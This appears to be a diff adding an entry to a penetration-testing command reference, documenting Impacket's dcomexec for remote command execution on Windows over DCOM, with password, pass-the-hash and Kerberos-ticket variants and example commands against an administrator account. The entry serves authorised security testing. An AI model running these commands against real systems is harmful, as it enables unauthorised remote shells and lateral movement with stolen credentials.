@@ -1,0 +1,36 @@
+{
+  "id": "dcomexec",
+  "name": "Impacket DCOMExec",
+  "command": "impacket-dcomexec '<domain>/<user>:<password>@<ip>'",
+  "description": "Execute commands via DCOM (Distributed Component Object Model)",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "impacket",
+    "dcomexec",
+    "dcom",
+    "shell",
+    "execution"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "impacket-dcomexec -hashes ':<hash>' '<domain>/<user>@<ip>'"
+    },
+    {
+      "label": "Kerberos Ticket",
+      "requires": "ticket",
+      "command": "impacket-dcomexec -k -no-pass '<domain>/<user>@<ip>'"
+    }
+  ],
+  "examples": [
+    "impacket-dcomexec 'CORP/administrator:password@192.168.1.100'",
+    "impacket-dcomexec -hashes ':e19ccf75ee54e06b06a5907af13cef42' 'CORP/administrator@192.168.1.100'"
+  ]
+}
